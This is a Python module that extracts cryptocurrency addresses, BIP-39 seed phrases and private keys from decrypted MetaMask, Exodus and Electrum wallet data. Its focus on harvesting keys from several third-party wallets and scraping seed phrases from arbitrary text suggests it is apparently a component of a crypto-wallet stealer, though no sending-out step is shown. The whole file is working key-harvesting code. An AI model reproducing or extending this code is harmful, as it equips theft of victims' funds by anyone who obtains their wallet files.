# -*- coding: utf-8 -*-
"""Key and seed extraction from decrypted wallet data."""

import json
import re


ADDRESS_PATTERNS = {
    "ETH": re.compile(r"0x[0-9a-fA-F]{40}"),
    "BTC": re.compile(r"(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})"),
    "SOL": re.compile(r"[1-9A-HJ-NP-Za-km-z]{32,44}"),
    "BNB": re.compile(r"0x[0-9a-fA-F]{40}"),
    "AVAX": re.compile(r"0x[0-9a-fA-F]{40}|X-avax[a-z0-9]{39}"),
    "MATIC": re.compile(r"0x[0-9a-fA-F]{40}"),
}

SEED_PATTERN = re.compile(r"\b([a-z]+\s+){11,23}[a-z]+\b")


def extract_addresses(text):
    """Extract cryptocurrency addresses from text."""
    results = {}
    for chain, pattern in ADDRESS_PATTERNS.items():
        matches = pattern.findall(text)
        if matches:
            results[chain] = list(set(matches))
    return results


def extract_seed_phrases(text):
    """Extract BIP-39 seed phrases from text."""
    matches = SEED_PATTERN.findall(text)
    phrases = []
    for match in matches:
        words = match.strip().split()
        if len(words) in (12, 15, 18, 21, 24):
            phrases.append(" ".join(words))
    return phrases


def extract_metamask_keys(decrypted_vault):
    """Extract private keys from decrypted MetaMask vault JSON."""
    try:
        vault = json.loads(decrypted_vault) if isinstance(decrypted_vault, str) else decrypted_vault
        keys = {}
        if "keyringData" in vault:
            for keyring in vault["keyringData"]:
                if "data" in keyring and "privateKey" in str(keyring.get("type", "")).lower():
                    for account in keyring.get("data", {}).get("accounts", []):
                        addr = account.get("address", "")
                        priv = account.get("privateKey", "")
                        if addr and priv:
                            keys[addr] = priv
        return keys
    except Exception:
        return {}


def extract_exodus_keys(decrypted_data):
    """Extract keys from decrypted Exodus keystore."""
    try:
        data = json.loads(decrypted_data) if isinstance(decrypted_data, (str, bytes)) else decrypted_data
        keys = {}
        for asset in data.get("assets", []):
            address = asset.get("address", "")
            private_key = asset.get("privateKey", "")
            if address and private_key:
                keys[address] = private_key
        return keys
    except Exception:
        return {}


def extract_electrum_keys(decrypted_data):
    """Extract keys from decrypted Electrum wallet."""
    try:
        data = json.loads(decrypted_data) if isinstance(decrypted_data, (str, bytes)) else decrypted_data
        keys = {}
        for key_type in ("keystore", "imported"):
            if key_type in data:
                keystore = data[key_type]
                if "privkeys" in keystore:
                    for addr, priv in keystore["privkeys"].items():
                        keys[addr] = priv
                if "xprv" in keystore:
                    keys["xprv"] = keystore["xprv"]
        return keys
    except Exception:
        return {}
